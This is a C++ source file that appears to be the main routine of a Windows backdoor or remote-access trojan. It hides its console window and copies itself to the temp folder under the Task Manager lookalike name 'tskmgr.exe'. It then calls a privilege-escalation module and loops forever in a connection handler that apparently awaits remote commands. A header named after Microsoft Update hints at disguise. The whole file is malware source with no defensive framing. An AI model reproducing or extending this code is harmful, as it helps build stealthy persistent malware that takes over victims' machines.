#include <iostream>
#include <time.h>

#include "MicrosoftUpdate.h"
#include "ServerConnection.h"
#include "System.h"
#include "PrivilegeEscalation.h"
#include "ConnectionHandler.h"
#include "Wait.h"
#include "Log.h"

#pragma comment(lib, "Ws2_32.lib")


int main(int argc, char** argv)
{
	// Hide the CMD prompt window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// System Properties Configuration
	System::setArguments(argc, argv);
	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());

	// Privilege Escalation
	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
	{
		// create temp of program file
		std::string tempFilePath = System::getTempPath();
		tempFilePath += "tskmgr.exe";
		std::wstring tempFilePathWstr(tempFilePath.begin(), tempFilePath.end());
		std::string programPath(argv[0]);
		std::wstring programPathWstr(programPath.begin(), programPath.end());
		CopyFile(programPathWstr.c_str(), tempFilePathWstr.c_str(), FALSE);

		if (PrivilegeEscalation::run())
		{
			exit(0);
		}
	}
	
	// Enable Logging to Screen (For Testing)
	Log::setLogging(true);

	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
	if (System::getIsSystemAdmin())
	{
		Log::log("Running as an Administrator!");
	}
	else
	{
		Log::log("Running as Low Privileged!");
	}

	ConnectionHandler* handler = new Wait();
	while (true)
	{
		handler = handler->run();
		if (!handler)
		{
			handler = new Wait();
		}
	}

	return 0;
}